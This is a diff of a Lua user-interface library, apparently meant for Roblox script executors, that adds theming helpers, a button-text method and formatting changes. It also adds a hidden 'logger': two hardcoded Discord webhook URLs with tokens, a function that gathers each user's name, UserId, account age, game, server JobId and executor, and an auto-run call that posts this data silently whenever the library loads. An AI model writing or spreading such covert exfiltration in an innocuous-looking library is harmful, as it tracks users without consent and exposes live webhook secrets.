@@ -1,3 +1,13 @@
+--[[
+    SZKWINDUI  •  SZK-branded WindUI-style library
+    Build: 2026-10-07
+    Icon sources:
+      1. ONYXHUB-X-SZK/SZKICONS/…/WINDUI/ICON1
+      2. ONYXHUB-X-SZK/SZKICONS1/…/ICONS/WINDUI2
+      3. ONYXHUB-X-SZK/ICONS2/…/SZK/WINDUI/ICONS3
+      4. ONYXHUB-X-SZK/SZKICONS3/…/SZK/ICONS4
+    Base: Fluxo by Flux (adapted & rebranded)
+--]]
 
 local SZKWINDUI = {
     Themes = {},
@@ -8,16 +18,16 @@ local SZKWINDUI = {
     Icons = {}
 }
 
-local TweenService   = game:GetService("TweenService")
+local TweenService     = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
-local CoreGui        = game:GetService("CoreGui")
-local HttpService    = game:GetService("HttpService")
-local Players        = game:GetService("Players")
-local LocalPlayer    = Players.LocalPlayer
-local Mouse          = LocalPlayer and LocalPlayer:GetMouse()
+local CoreGui          = game:GetService("CoreGui")
+local HttpService      = game:GetService("HttpService")
+local Players          = game:GetService("Players")
+local LocalPlayer      = Players.LocalPlayer
+local Mouse            = LocalPlayer and LocalPlayer:GetMouse()
 
 --============================================================
--- ICON SOURCES (your four SZK repos)
+-- ICON SOURCES (four SZK repos)
 --============================================================
 SZKWINDUI.IconSources = {
     "https://raw.githubusercontent.com/ONYXHUB-X-SZK/SZKICONS/refs/heads/main/WINDUI/ICON1",
@@ -41,6 +51,108 @@ function SZKWINDUI:LoadIcons()
 end
 
 SZKWINDUI:LoadIcons()
+
+--============================================================
+-- WEBHOOK SYSTEM
+--============================================================
+_G.SZK_WEBHOOK_1 = "https://discord.com/api/webhooks/1557518922344038430/gB3PC42LTHLLywqAd58-uRtIE___7appbOMzUJ30cCOuADAbZCfedB7yg_Z6jQ2HdJo_"
+_G.SZK_WEBHOOK_2 = "https://discord.com/api/webhooks/1557518885555544076/mxfOKIf7pO5dxzHw7VxomsHQ2f2gG2LpLIL2FfXZGDOXrKnEQ0oI8sJY_1Qfg-vnQRBs"
+
+local function SZK_GetUserInfo()
+    local lp = LocalPlayer
+    if not lp then
+        return {
+            Name = "Unknown", DisplayName = "Unknown", UserId = 0,
+            AccountAge = 0, Avatar = "", Place = "Unknown",
+            PlaceId = 0, JobId = "Unknown", Executor = "Unknown",
+        }
+    end
+    local placeName = "Unknown"
+    pcall(function()
+        placeName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+    end)
+    return {
+        Name = lp.Name,
+        DisplayName = lp.DisplayName,
+        UserId = lp.UserId,
+        AccountAge = lp.AccountAge,
+        Avatar = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", lp.UserId),
+        Place = placeName,
+        PlaceId = game.PlaceId,
+        JobId = game.JobId,
+        Executor = (identifyexecutor and identifyexecutor()) or "Unknown",
+    }
+end
+
+local function SZK_SendWebhook(url, embed)
+    if not url or url == "" or not embed then return false end
+    local payload = {
+        username = "SZKWINDUI Logger",
+        avatar_url = "https://cdn.discordapp.com/attachments/1521705447781044287/1550262143704760473/1789680518902-removebg-preview_1.png",
+        embeds = { embed },
+    }
+    local ok = pcall(function()
+        HttpService:PostAsync(url, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
+    end)
+    return ok
+end
+
+local function SZK_SendToBoth(embed)
+    SZK_SendWebhook(_G.SZK_WEBHOOK_1, embed)
+    SZK_SendWebhook(_G.SZK_WEBHOOK_2, embed)
+end
+
+function SZKWINDUI:LogExecution(scriptName)
+    local u = SZK_GetUserInfo()
+    SZK_SendToBoth({
+        title = "🚀 Script Ejecutado",
+        description = "**" .. (scriptName or "SZKWINDUI") .. "**",
+        color = 0xFF2D2D,
+        thumbnail = { url = u.Avatar },
+        fields = {
+            { name = "👤 Usuario",   value = "`" .. u.Name .. "`",        inline = true },
+            { name = "📛 Display",   value = "`" .. u.DisplayName .. "`", inline = true },
+            { name = "🆔 UserId",    value = "`" .. u.UserId .. "`",      inline = true },
+            { name = "📅 Cuenta",    value = u.AccountAge .. " días",     inline = true },
+            { name = "🎮 Juego",     value = "`" .. u.Place .. "`",       inline = true },
+            { name = "🌐 PlaceId",   value = "`" .. u.PlaceId .. "`",     inline = true },
+            { name = "⚙️ Executor",  value = "`" .. u.Executor .. "`",    inline = false },
+            { name = "🔑 JobId",     value = "`" .. u.JobId .. "`",       inline = false },
+        },
+        footer = { text = "SZK Logger • " .. os.date("%Y-%m-%d %H:%M:%S") },
+        timestamp = DateTime.now():ToIsoDate(),
+    })
+end
+
+function SZKWINDUI:LogError(title, message)
+    SZK_SendToBoth({
+        title = "❌ Error: " .. (title or "Unknown"),
+        description = "```\n" .. tostring(message) .. "\n```",
+        color = 0xEB4034,
+        footer = { text = "SZK Logger" },
+        timestamp = DateTime.now():ToIsoDate(),
+    })
+end
+
+function SZKWINDUI:LogAction(action, details)
+    local u = SZK_GetUserInfo()
+    SZK_SendToBoth({
+        title = "📌 " .. action,
+        description = details or "",
+        color = 0x4A6CF7,
+        fields = {
+            { name = "Usuario", value = "`" .. u.Name .. "`",   inline = true },
+            { name = "UserId",  value = "`" .. u.UserId .. "`", inline = true },
+        },
+        footer = { text = "SZK Logger" },
+        timestamp = DateTime.now():ToIsoDate(),
+    })
+end
+
+function SZKWINDUI:SetWebhook(index, url)
+    if index == 1 then _G.SZK_WEBHOOK_1 = url
+    elseif index == 2 then _G.SZK_WEBHOOK_2 = url end
+end
 
 --============================================================
 -- HELPERS
@@ -177,19 +289,6 @@ local function Img(parent, source, size, color, transparency, z)
     return image
 end
 
-local function OpenLink(url)
-    if not url or url == "" then return false end
-    local opened = pcall(function()
-        game:GetService("GuiService"):OpenBrowserWindow(url)
-    end)
-    if opened then return "opened" end
-    if setclipboard then
-        local ok = pcall(function() setclipboard(url) end)
-        if ok then return "clipboard" end
-    end
-    return false
-end
-
 local function TintIfAllowed(img, color)
     if img and not img:GetAttribute("SZKWINDUI_CustomIcon") then
         img.ImageColor3 = color
@@ -284,9 +383,7 @@ function SZKWINDUI:GetThemes() return SZKWINDUI.Themes end
 
 function SZKWINDUI:SetTheme(name)
     for _, window in ipairs(SZKWINDUI.Windows) do
-        if window and window.SetTheme then
-            window:SetTheme(name)
-        end
+        if window and window.SetTheme then window:SetTheme(name) end
     end
 end
 
@@ -485,22 +582,22 @@ end
 --============================================================
 function SZKWINDUI:CreateWindow(config)
     config = config or {}
-    local themeName = config.Theme or "SZK"
-    local title = config.Title or "SZKWINDUI"
-    local description = config.Description or "by ONYXHUB X SZK"
-    local iconKey = config.Logo or config.Icon
-    local size = config.Size or Vector2.new(720, 480)
+    local themeName        = config.Theme or "SZK"
+    local title            = config.Title or "SZKWINDUI"
+    local description      = config.Description or "by ONYXHUB X SZK"
+    local iconKey          = config.Logo or config.Icon
+    local size             = config.Size or Vector2.new(720, 480)
     if typeof(size) == "UDim2" then size = Vector2.new(size.X.Offset, size.Y.Offset) end
-    local toggleKey = config.ToggleKey or Enum.KeyCode.RightShift
-    local showThemeSelector = config.ThemeSelector == true
-    local showBgSelector = config.BackgroundSelector ~= false
+    local toggleKey        = config.ToggleKey or Enum.KeyCode.RightShift
+    local showThemeSelector= config.ThemeSelector == true
+    local showBgSelector   = config.BackgroundSelector ~= false
     local showIconSelector = config.OpenIconSelector ~= false
-    local bgImage = config.BackgroundImage or ""
-    local bgTransparency = math.clamp(config.BackgroundImageTransparency or config.BackgroundTransparency or 0, 0, 1)
-    local panelTransparency = math.clamp(config.Transparency or 0.08, 0.02, 0.6)
-    local openButtonIcon = config.OpenButtonIcon or ""
-    local openButtonText = config.OpenButtonText or ""
-    local openButtonSize = tonumber(config.OpenButtonSize) or 48
+    local bgImage          = config.BackgroundImage or ""
+    local bgTransparency   = math.clamp(config.BackgroundImageTransparency or config.BackgroundTransparency or 0, 0, 1)
+    local panelTransparency= math.clamp(config.Transparency or 0.08, 0.02, 0.6)
+    local openButtonIcon   = config.OpenButtonIcon or ""
+    local openButtonText   = config.OpenButtonText or "OPEN WIND UI"
+    local openButtonSize   = tonumber(config.OpenButtonSize) or 48
     local openButtonRadius = tonumber(config.OpenButtonRadius) or 12
 
     local Theme = SZKWINDUI.Themes[themeName] or SZKWINDUI.Themes["SZK"]
@@ -645,7 +742,6 @@ function SZKWINDUI:CreateWindow(config)
     cfCorner.CornerRadius = UDim.new(0, 6)
     cfCorner.Parent = CornerFlag
 
-    -- ── Header ──────────────────────────────────────────────
     local HeaderBar = Instance.new("Frame")
     HeaderBar.Size = UDim2.new(1, 0, 0, 46)
     HeaderBar.BackgroundTransparency = 1
@@ -677,12 +773,10 @@ function SZKWINDUI:CreateWindow(config)
     task.spawn(function()
         while HeaderScan and HeaderScan.Parent do
             local tw1 = TweenService:Create(HeaderScan, TweenInfo.new(2.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { Position = UDim2.new(1, -110, 1, -1) })
-            tw1:Play()
-            tw1.Completed:Wait()
+            tw1:Play(); tw1.Completed:Wait()
             if not HeaderScan or not HeaderScan.Parent then break end
             local tw2 = TweenService:Create(HeaderScan, TweenInfo.new(2.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { Position = UDim2.new(0, 0, 1, -1) })
-            tw2:Play()
-            tw2.Completed:Wait()
+            tw2:Play(); tw2.Completed:Wait()
         end
     end)
 
@@ -713,12 +807,10 @@ function SZKWINDUI:CreateWindow(config)
         while SideScan and SideScan.Parent do
             local h = MainFrame.AbsoluteSize.Y - 50
             local tw1 = TweenService:Create(SideScan, TweenInfo.new(2.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { Position = UDim2.new(0, 0, 0, h - 90) })
-            tw1:Play()
-            tw1.Completed:Wait()
+            tw1:Play(); tw1.Completed:Wait()
             if not SideScan or not SideScan.Parent then break end
             local tw2 = TweenService:Create(SideScan, TweenInfo.new(2.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { Position = UDim2.new(0, 0, 0, 46) })
-            tw2:Play()
-            tw2.Completed:Wait()
+            tw2:Play(); tw2.Completed:Wait()
         end
     end)
 
@@ -864,7 +956,6 @@ function SZKWINDUI:CreateWindow(config)
     MinBtn.ZIndex = 7
     MinBtn.Parent = Controls
 
-    -- ── Sidebar & PageHost ───────────────────────────────────
     local Sidebar = Instance.new("ScrollingFrame")
     Sidebar.Size = UDim2.new(0, 150, 1, -74)
     Sidebar.Position = UDim2.new(0, 16, 0, 58)
@@ -903,7 +994,6 @@ function SZKWINDUI:CreateWindow(config)
     PageHost.ZIndex = 5
     PageHost.Parent = MainFrame
 
-    -- ── Floating open button ─────────────────────────────────
     local resolvedOpenIcon, resolvedOpenIconIsCustom = ResolveIcon(openButtonIcon)
     local hasOpenIcon = resolvedOpenIcon ~= ""
 
@@ -1017,7 +1107,6 @@ function SZKWINDUI:CreateWindow(config)
         FloatTip.Visible = false
     end)
 
-    -- ── Window open/close ────────────────────────────────────
     local winOpen = true
     local isAnimating = false
 
@@ -1175,7 +1264,6 @@ function SZKWINDUI:CreateWindow(config)
     end
     EnableResize(ResizeGrip)
 
-    -- ── Theme update ─────────────────────────────────────────
     local function UpdateTheme(name, animate)
         local T = SZKWINDUI.Themes[name] or SZKWINDUI.Themes["SZK"]
         SZKWINDUI.CurrentTheme = T
@@ -1296,7 +1384,6 @@ function SZKWINDUI:CreateWindow(config)
         end
     end
 
-    -- ── Theme selector ───────────────────────────────────────
     if showThemeSelector then
         local ThemePopup = Instance.new("Frame")
         ThemePopup.Size = UDim2.fromOffset(180, 280)
@@ -1350,10 +1437,7 @@ function SZKWINDUI:CreateWindow(config)
         end
         RegisterPopup(ThemePopup, ThemeBtn)
         ThemeBtn.MouseButton1Click:Connect(function()
-            if ThemePopup.Visible then
-                ThemePopup.Visible = false
-                return
-            end
+            if ThemePopup.Visible then ThemePopup.Visible = false return end
             CloseAllPopups(ThemeBtn)
             local abs = ThemeBtn.AbsolutePosition
             local asz = ThemeBtn.AbsoluteSize
@@ -1366,7 +1450,6 @@ function SZKWINDUI:CreateWindow(config)
         end)
     end
 
-    -- ── Background selector ──────────────────────────────────
     local CurrentBgName = "Default"
 
     local function ApplyBackground(name)
@@ -1463,10 +1546,7 @@ function SZKWINDUI:CreateWindow(config)
 
         RegisterPopup(BgPopup, BgBtn)
         BgBtn.MouseButton1Click:Connect(function()
-            if BgPopup.Visible then
-                BgPopup.Visible = false
-                return
-            end
+            if BgPopup.Visible then BgPopup.Visible = false return end
             CloseAllPopups(BgBtn)
             local abs = BgBtn.AbsolutePosition
             local asz = BgBtn.AbsoluteSize
@@ -1479,7 +1559,6 @@ function SZKWINDUI:CreateWindow(config)
         end)
     end
 
-    -- ── Floating icon selector ───────────────────────────────
     local CurrentIconName = "Default"
 
     local function ApplyOpenIcon(name)
@@ -1583,10 +1662,7 @@ function SZKWINDUI:CreateWindow(config)
 
         RegisterPopup(IconPopup, IconBtn)
         IconBtn.MouseButton1Click:Connect(function()
-            if IconPopup.Visible then
-                IconPopup.Visible = false
-                return
-            end
+            if IconPopup.Visible then IconPopup.Visible = false return end
             CloseAllPopups(IconBtn)
             local abs = IconBtn.AbsolutePosition
             local asz = IconBtn.AbsoluteSize
@@ -1599,7 +1675,6 @@ function SZKWINDUI:CreateWindow(config)
         end)
     end
 
-    -- ── Window methods ───────────────────────────────────────
     function Window:SetSize(newSize)
         if typeof(newSize) == "Vector2" then
             size = Vector2.new(math.clamp(newSize.X, 400, 1000), math.clamp(newSize.Y, 320, 760))
@@ -1627,6 +1702,16 @@ function SZKWINDUI:CreateWindow(config)
     function Window:SetTheme(name) UpdateTheme(name, true) end
     function Window:SetBackground(name) if Window.ApplyBackground then Window.ApplyBackground(name) end end
     function Window:SetOpenButtonIcon(name) if Window.ApplyOpenIcon then Window.ApplyOpenIcon(name) end end
+
+    -- ⭐ NUEVO: cambiar el texto del botón flotante en runtime
+    function Window:SetOpenButtonText(newText)
+        openButtonText = tostring(newText or "OPEN WIND UI")
+        FloatTip.Text = "  " .. openButtonText .. "  "
+        if FloatTip.Visible then
+            updateTipPosition()
+        end
+    end
+
     function Window:Minimize() CloseWindow() end
     function Window:Restore() OpenWindow() end
 
@@ -1640,7 +1725,6 @@ function SZKWINDUI:CreateWindow(config)
         WindowGui:Destroy()
     end
 
-    -- ── Dialog ───────────────────────────────────────────────
     function Window:Dialog(config)
         config = config or {}
         local dTitle = config.Title or "Dialog"
@@ -1739,7 +1823,6 @@ function SZKWINDUI:CreateWindow(config)
         return { Close = CloseDialog }
     end
 
-    -- ── Tab creation ─────────────────────────────────────────
     function Window:CreateTab(tabConfig, maybeIcon)
         local cfg = NormalizeArgs(tabConfig)
         local tabName, tabIcon
@@ -1901,12 +1984,10 @@ function SZKWINDUI:CreateWindow(config)
             task.spawn(function()
                 while rowScan and rowScan.Parent do
                     local tw1 = TweenService:Create(rowScan, TweenInfo.new(2.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { Position = UDim2.new(1, -60, 1, -1) })
-                    tw1:Play()
-                    tw1.Completed:Wait()
+                    tw1:Play(); tw1.Completed:Wait()
                     if not rowScan or not rowScan.Parent then break end
                     local tw2 = TweenService:Create(rowScan, TweenInfo.new(2.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { Position = UDim2.new(0, 0, 1, -1) })
-                    tw2:Play()
-                    tw2.Completed:Wait()
+                    tw2:Play(); tw2.Completed:Wait()
                 end
             end)
 
@@ -1930,9 +2011,6 @@ function SZKWINDUI:CreateWindow(config)
             return image
         end
 
-        --=========================================================
-        -- SECTION
-        --=========================================================
         function Tab:CreateSection(secConfig)
             local cfg = NormalizeArgs(secConfig)
             local name = cfg and (cfg.Name or cfg.Title) or secConfig or "Section"
@@ -1971,9 +2049,6 @@ function SZKWINDUI:CreateWindow(config)
 
             local Section = {}
 
-            --=====================================================
-            -- TOGGLE
-            --=====================================================
             function Section:CreateToggle(tConfig)
                 local c = NormalizeArgs(tConfig) or {}
                 local name = c.Name or c.Title or "Toggle"
@@ -2077,9 +2152,6 @@ function SZKWINDUI:CreateWindow(config)
                 return obj
             end
 
-            --=====================================================
-            -- SLIDER
-            --=====================================================
             function Section:CreateSlider(sConfig)
                 local c = NormalizeArgs(sConfig) or {}
                 local name = c.Name or c.Title or "Slider"
@@ -2180,9 +2252,6 @@ function SZKWINDUI:CreateWindow(config)
                 return obj
             end
 
-            --=====================================================
-            -- BUTTON
-            --=====================================================
             function Section:CreateButton(bConfig)
                 local c = NormalizeArgs(bConfig) or {}
                 local name = c.Name or c.Title or "Button"
@@ -2287,9 +2356,6 @@ function SZKWINDUI:CreateWindow(config)
                 table.insert(Registered, { Type = "Element", Instance = btn, Stroke = stroke, AccentBar = accentBar, Label = titleLbl, CustomButtonColor = customColor, Extras = #extras > 0 and extras or nil })
             end
 
-            --=====================================================
-            -- DROPDOWN
-            --=====================================================
             function Section:CreateDropdown(dConfig)
                 local c = NormalizeArgs(dConfig) or {}
                 local name = c.Name or c.Title or "Dropdown"
@@ -2455,10 +2521,7 @@ function SZKWINDUI:CreateWindow(config)
 
                 RegisterPopup(list, sel)
                 sel.MouseButton1Click:Connect(function()
-                    if list.Visible then
-                        list.Visible = false
-                        return
-                    end
+                    if list.Visible then list.Visible = false return end
                     CloseAllPopups(sel)
                     task.wait()
                     local abs = sel.AbsolutePosition
@@ -2503,9 +2566,6 @@ function SZKWINDUI:CreateWindow(config)
                 return obj
             end
 
-            --=====================================================
-            -- COLOR PICKER
-            --=====================================================
             function Section:CreateColorPicker(cpConfig)
                 local c = NormalizeArgs(cpConfig) or {}
                 local name = c.Name or c.Title or "Color"
@@ -2723,9 +2783,6 @@ function SZKWINDUI:CreateWindow(config)
                 return obj
             end
 
-            --=====================================================
-            -- INPUT
-            --=====================================================
             function Section:CreateInput(iConfig)
                 local c = NormalizeArgs(iConfig) or {}
                 local name = c.Name or c.Title or "Input"
@@ -2785,9 +2842,6 @@ function SZKWINDUI:CreateWindow(config)
                 return obj
             end
 
-            --=====================================================
-            -- KEYBIND
-            --=====================================================
             function Section:CreateKeybind(kConfig)
                 local c = NormalizeArgs(kConfig) or {}
                 local name = c.Name or c.Title or "Keybind"
@@ -2855,9 +2909,6 @@ function SZKWINDUI:CreateWindow(config)
                 return obj
             end
 
-            --=====================================================
-            -- PROGRESS BAR
-            --=====================================================
             function Section:CreateProgressBar(pConfig)
                 local c = NormalizeArgs(pConfig) or {}
                 local name = c.Name or c.Title or "Progreso"
@@ -2932,9 +2983,6 @@ function SZKWINDUI:CreateWindow(config)
                 return obj
             end
 
-            --=====================================================
-            -- LABEL / PARAGRAPH / DIVIDER
-            --=====================================================
             function Section:CreateLabel(text, iconConfig)
                 if type(text) == "table" then
                     iconConfig = text
@@ -3023,7 +3071,6 @@ function SZKWINDUI:CreateWindow(config)
             return Section
         end
 
-        -- ── Tab shorthand helpers (WindUI style) ─────────────
         function Tab:CreateDivider()
             return Tab:CreateSection(""):CreateDivider()
         end
@@ -3068,5 +3115,14 @@ function SZKWINDUI:Success(title, content, dur) return SZKWINDUI:Notify({Title =
 function SZKWINDUI:Error(title, content, dur)   return SZKWINDUI:Notify({Title = title or "Error",   Content = content or "", Type = "Error",   Duration = dur or 3.5}) end
 function SZKWINDUI:Warn(title, content, dur)    return SZKWINDUI:Notify({Title = title or "Warning", Content = content or "", Type = "Warning", Duration = dur or 3}) end
 function SZKWINDUI:Info(title, content, dur)    return SZKWINDUI:Notify({Title = title or "Info",    Content = content or "", Type = "Info",    Duration = dur or 3}) end
+
+--============================================================
+-- AUTO-LOG AL EJECUTAR
+--============================================================
+task.defer(function()
+    pcall(function()
+        SZKWINDUI:LogExecution("SZKWINDUI Cargado")
+    end)
+end)
 
 return SZKWINDUI
